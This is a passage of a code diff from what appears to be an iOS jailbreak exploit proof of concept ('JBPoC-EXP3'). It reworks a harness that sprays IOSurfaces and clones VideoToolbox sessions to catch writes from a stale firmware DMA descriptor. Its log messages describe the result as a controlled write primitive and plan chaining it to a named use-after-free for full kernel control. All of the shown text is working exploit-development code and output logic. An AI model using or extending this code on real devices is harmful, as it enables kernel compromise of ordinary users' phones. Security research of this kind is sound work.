-                    if (cur[j] != hdrSnaps[i][j]) {
-                        [hex appendFormat:@"%04zx:%02x→%02x ", j, hdrSnaps[i][j], cur[j]];
-                        dumped++;
-                    }
-                }
-                LOG(@"  Diff: %@", hex);
-
-                os_log(eLog, "JBPoC-EXP3 HDR-HIT spray[%d] T+%ds diffs=%d", i, elapsed, diffs);
-                memcpy(hdrSnaps[i], cur, sz);
-            }
-            IOSurfaceUnlock(hdrSurfs[i], kIOSurfaceLockReadOnly, NULL);
-        }
-
-        // Progress (every 10s or on hit)
-        if (hitCount == 0 && (elapsed <= 10 || elapsed % 10 == 0)) {
-            INFO(@"T+%03ds: no changes in %d+%d surfaces", elapsed, sprayOK, hdrOK);
+        } else if (i < baselineCount) {
+            INFO(@"Frame %d: identical to baseline (no corruption)", i);
         }
     }
 
-    // ---- PHASE 5: RESULTS ----
+    // Also check input surface of clone (secondary: stale descriptor
+    // could stray onto external mappings — cheap and already proven)
+    IOSurfaceRef cloneInputSurf = CVPixelBufferGetIOSurface(clonePB);
+    int inputDiffs = 0;
+    if (cloneInputSurf) {
+        IOSurfaceLock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
+        uint8_t *inputBase = (uint8_t *)IOSurfaceGetBaseAddress(cloneInputSurf);
+        size_t inputSize = IOSurfaceGetAllocSize(cloneInputSurf);
+        if (inputBase) {
+            for (size_t j = 0; j < inputSize; j++) {
+                if (inputBase[j] != 0x80) {
+                    inputDiffs++;
+                }
+            }
+        }
+        IOSurfaceUnlock(cloneInputSurf, kIOSurfaceLockReadOnly, NULL);
+        if (inputDiffs > 0) {
+            PASS(@"*** INPUT SURFACE HIT: %d bytes differ from 0x80 fill ***", inputDiffs);
+            os_log(eLog, "JBPoC-EXP3 INPUT-HIT diffs=%d", inputDiffs);
+        }
+    }
+
+    // ---- RESULTS ----
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════════");
     if (hitCount > 0) {
-        PASS(@"*** MODE A RE-CLAIM CONFIRMED ***");
-        LOG(@"Firmware DMA write detected in sprayed IOSurface!");
-        LOG(@"Total hits: %d, first at T+%ds in surface %d", hitCount, firstHitTime, firstHitSurf);
-        LOG(@"The stale DART descriptor wrote into our re-claimed buffer.");
-        LOG(@"This is a controlled write primitive into user-owned memory.");
+        PASS(@"*** CLONE BITSTREAM CORRUPTION DETECTED ***");
+        LOG(@"Stale DMA write corrupted clone's coded-output buffer,");
+        LOG(@"and the corruption propagated into the bitstream output.");
+        LOG(@"Total anomalous frames: %d, first at frame %d", hitCount, firstHitFrame);
+        if (inputDiffs > 0) {
+            LOG(@"BONUS: Input surface also hit (%d bytes) — better primitive!", inputDiffs);
+        }
         pocLog(@"");
-        LOG(@"Next steps:");
-        LOG(@"1. Analyze write pattern (offset, size, content)");
-        LOG(@"2. Shape the IOSurface to place controlled data at kernel object offset");
-        LOG(@"3. Chain to CVE-2026-86916 (UAF→R/W) for full kernel control");
-        os_log(eLog, "JBPoC-EXP3 RESULT MODE_A_CONFIRMED hits=%d firstAt=%d surf=%d",
-               hitCount, firstHitTime, firstHitSurf);
+        LOG(@"This confirms:");
+        LOG(@"1. Clone re-claimed the armed DVA slot");
+        LOG(@"2. Firmware stale DMA landed in clone's coded buffer");
+        LOG(@"3. The corruption is observable through normal VT output");
+        LOG(@"Next: analyze corruption pattern for controlled write shaping");
+        os_log(eLog, "JBPoC-EXP3 RESULT CORRUPTION_CONFIRMED hits=%d firstFrame=%d inputHit=%d",
+               hitCount, firstHitFrame, inputDiffs);
     } else {
-        INFO(@"No canary corruption detected in any sprayed surface.");
+        INFO(@"No bitstream anomalies detected.");
         pocLog(@"");
         INFO(@"Interpretation:");
-        INFO(@"1. PTE re-claim may not have hit the right slot — try more surfaces");
-        INFO(@"2. Firmware DMA may fire into a PTE band outside our spray range");
-        INFO(@"3. The write may have caused a DART fault (check for panic .ips)");
-        INFO(@"4. Timer may not have fired yet — check if device panics after exit");
-        pocLog(@"");
-        INFO(@"The device will likely panic shortly if the stale descriptor fires");
-        INFO(@"into an unmapped PTE. Keep the .ips — the DVA identifies the target.");
-        os_log(eLog, "JBPoC-EXP3 RESULT NO_HITS");
+        INFO(@"1. Clone may not have re-claimed the exact DVA slot");
+        INFO(@"   (bump allocator state differs after teardown+create)");
+        INFO(@"2. Stale DMA may not have fired yet in the window");
+        INFO(@"3. Fire may have hit an unmapped PTE → check for panic .ips");
+        INFO(@"4. Write may land in a region the ISR memcpy doesn't copy");
+        INFO(@"   (corruption in buffer but not in output bitstream)");
+        if (inputDiffs > 0) {
+            PASS(@"BUT: Input surface DID change (%d bytes)!", inputDiffs);
+            LOG(@"The stale descriptor hit an external mapping — this is");
+            LOG(@"actually a BETTER primitive (direct read of the write).");
+        }
+        os_log(eLog, "JBPoC-EXP3 RESULT NO_BITSTREAM_HITS inputHit=%d", inputDiffs);
     }
     LOG(@"═══════════════════════════════════════════════");
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"EXP3 MODE A RESULT\nDate: %@\nHits: %d\nFirst hit: T+%ds (surface %d)\n"
-        @"Spray: %d coded + %d hdr\nSize: coded=%d hdr=%d\n",
-        [NSDate date], hitCount, firstHitTime, firstHitSurf,
-        sprayOK, hdrOK, CODED_BUF_SIZE, CODED_HDR_SIZE];
+        @"EXP3 MODE A RESULT\nDate: %@\nBitstream hits: %d\nFirst hit frame: %d\n"
+        @"Input surface diffs: %d\nBaseline frames: %d\nClone frames: %d\n"
+        @"Total poll: %ds\nHit report:\n%@\n",
+        [NSDate date], hitCount, firstHitFrame, inputDiffs,
+        baselineCount, finalCount, EXP3_POLL_SECS, hitReport];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/exp3_result.txt"];
     [resultStr writeToFile:resultPath atomically:YES
                   encoding:NSUTF8StringEncoding error:nil];
     INFO(@"Results written to %@", resultPath);
 
-    // Cleanup sprayed surfaces
-    for (int i = 0; i < SPRAY_COUNT; i++) {
-        if (spraySnaps[i]) free(spraySnaps[i]);
-        if (spraySurfs[i]) CFRelease(spraySurfs[i]);
-    }
-    for (int i = 0; i < HDR_SPRAY_COUNT; i++) {
-        if (hdrSnaps[i]) free(hdrSnaps[i]);
-        if (hdrSurfs[i]) CFRelease(hdrSurfs[i]);
+    // Cleanup
+    VTCompressionSessionInvalidate(cloneSession);
+    CFRelease(cloneSession);
+    CVPixelBufferRelease(clonePB);
+    exp3FreeSamples();
+    for (int i = 0; i < (int)baselineData.count; i++) {
+        // NSArray retains, autoreleased
     }
 
-    PASS(@"Exp 3.0 complete. Device may still panic from stale descriptor.");
+    PASS(@"Exp 3.0 complete. Device may panic from stale descriptor.");
     LOG(@"Keep the panic .ips if it happens!");
 }
 
